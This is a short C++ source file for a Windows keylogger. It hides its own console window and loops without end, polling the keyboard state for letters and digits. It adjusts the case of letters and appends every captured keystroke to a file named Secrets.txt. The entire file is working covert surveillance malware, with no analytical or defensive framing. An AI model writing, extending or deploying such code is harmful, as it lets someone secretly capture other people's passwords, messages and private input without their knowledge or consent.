#include <Windows.h>
#include <WinUser.h>
#include <fstream>
#include <iostream>

//hide the app window
void hideAppWindow() {
	HWND consoleWindow = GetConsoleWindow();
	//AllocConsole();
	//consoleWindow = FindWindowA("", NULL);
	ShowWindow(consoleWindow, 0);
}

int main() {
	//hide the app window
	hideAppWindow();
	char keyPressed;
	std::ofstream secrets("Secrets.txt", std::ios::app);


	while (true) {

		Sleep(0);
		for (keyPressed = 48; keyPressed < 123; keyPressed += 1) {
			if (GetAsyncKeyState(keyPressed) == -32767) 
			{
				if (keyPressed >= 65 && keyPressed <= 90 &&
					!GetAsyncKeyState(VK_SHIFT)) {
					keyPressed += 32;
				}

				secrets << keyPressed;
				secrets.flush();
				
			}
		}

	}
}
